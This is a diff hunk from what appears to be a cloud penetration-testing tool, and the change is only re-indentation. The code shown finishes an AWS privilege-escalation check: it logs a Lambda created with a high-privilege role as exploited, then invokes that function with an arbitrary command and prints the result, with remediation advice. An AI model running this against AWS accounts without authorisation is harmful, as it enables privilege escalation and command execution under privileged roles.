@@ -309,45 +309,45 @@ def handler(event, context):
       return { output: output.join("\n"), findings }
     }
 
-  output.push(`[+] Function created with role ${roleArn}`)
-  findings.push({
-    checkId: "AWS-PRIVESC-003",
-    provider: "aws",
-    severity: "critical",
-    status: "EXPLOITED",
-    resource: `lambda:${funcName}`,
-    title: `Lambda created with high-priv role: ${funcName}`,
-    details: `Function ${funcName} executes as ${roleArn}`,
-    remediation: "Delete function and restrict iam:PassRole + lambda:CreateFunction",
-  })
+    output.push(`[+] Function created with role ${roleArn}`)
+    findings.push({
+      checkId: "AWS-PRIVESC-003",
+      provider: "aws",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `lambda:${funcName}`,
+      title: `Lambda created with high-priv role: ${funcName}`,
+      details: `Function ${funcName} executes as ${roleArn}`,
+      remediation: "Delete function and restrict iam:PassRole + lambda:CreateFunction",
+    })
 
-  await new Promise((resolve) => setTimeout(resolve, 3000))
+    await new Promise((resolve) => setTimeout(resolve, 3000))
 
-  const invoke = await aws(
-    [
-      "lambda",
-      "invoke",
-      "--function-name",
-      funcName,
-      "--payload",
-      JSON.stringify({ cmd: command }),
-      "--cli-binary-format",
-      "raw-in-base64-out",
-      "/dev/stdout",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+    const invoke = await aws(
+      [
+        "lambda",
+        "invoke",
+        "--function-name",
+        funcName,
+        "--payload",
+        JSON.stringify({ cmd: command }),
+        "--cli-binary-format",
+        "raw-in-base64-out",
+        "/dev/stdout",
+      ],
+      profile,
+      region,
+      timeout,
+    )
 
-  if (invoke.exitCode === 0) {
-    output.push(`\n[+] Command output:`)
-    output.push(invoke.stdout.trim())
-  } else {
-    output.push(`[-] Invoke failed: ${invoke.stderr.trim()}`)
-  }
+    if (invoke.exitCode === 0) {
+      output.push(`\n[+] Command output:`)
+      output.push(invoke.stdout.trim())
+    } else {
+      output.push(`[-] Invoke failed: ${invoke.stderr.trim()}`)
+    }
 
-  return { output: output.join("\n"), findings }
+    return { output: output.join("\n"), findings }
   } finally {
     const { unlink } = await import("node:fs/promises")
     await unlink(pyPath).catch(() => {})
